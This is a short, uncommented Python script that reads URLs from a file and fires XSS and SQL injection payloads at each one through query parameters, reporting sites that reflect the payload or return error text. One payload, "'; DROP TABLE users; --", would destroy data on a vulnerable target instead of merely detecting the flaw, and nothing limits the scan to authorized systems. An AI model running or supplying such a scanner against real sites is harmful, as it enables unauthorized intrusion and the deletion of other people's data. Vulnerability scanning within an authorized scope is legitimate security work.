import requests

xss_payloads = ["<script>alert(1)</script>", "'><img src=x onerror=alert(1)>"]
sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]

def scan_xss(url):
    for payload in xss_payloads:
        test_url = f"{url}?q={payload}"
        response = requests.get(test_url)
        if payload in response.text:
            print(f"[XSS] Vulnerable URL: {test_url}")

def scan_sqli(url):
    for payload in sql_payloads:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)
        if "sql" in response.text.lower() or "error" in response.text.lower():
            print(f"[SQLi] Possible Vulnerable URL: {test_url}")

if __name__ == "__main__":
    with open("urls.txt", "r") as file:
        urls = file.read().splitlines()

    for url in urls:
        print(f"Scanning {url}")
        scan_xss(url)
        scan_sqli(url)
